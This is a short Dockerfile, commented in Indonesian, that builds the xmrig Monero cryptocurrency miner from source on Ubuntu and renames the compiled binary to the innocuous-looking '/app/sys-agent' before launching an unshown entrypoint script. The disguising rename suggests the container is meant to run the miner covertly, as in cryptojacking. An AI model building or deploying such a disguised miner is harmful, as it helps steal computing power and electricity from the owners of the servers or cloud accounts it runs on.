FROM ubuntu:22.04

# Minimal install dependencies yang diperlukan
RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential cmake git libhwloc-dev libuv1-dev libssl-dev && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Clone xmrig dengan depth 1 supaya lebih cepat
RUN git clone --depth=1 https://github.com/xmrig/xmrig.git

WORKDIR /app/xmrig

RUN mkdir build && cd build && cmake .. && make -j$(nproc)

RUN mv /app/xmrig/build/xmrig /app/sys-agent && chmod +x /app/sys-agent

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

WORKDIR /app

CMD ["/entrypoint.sh"]
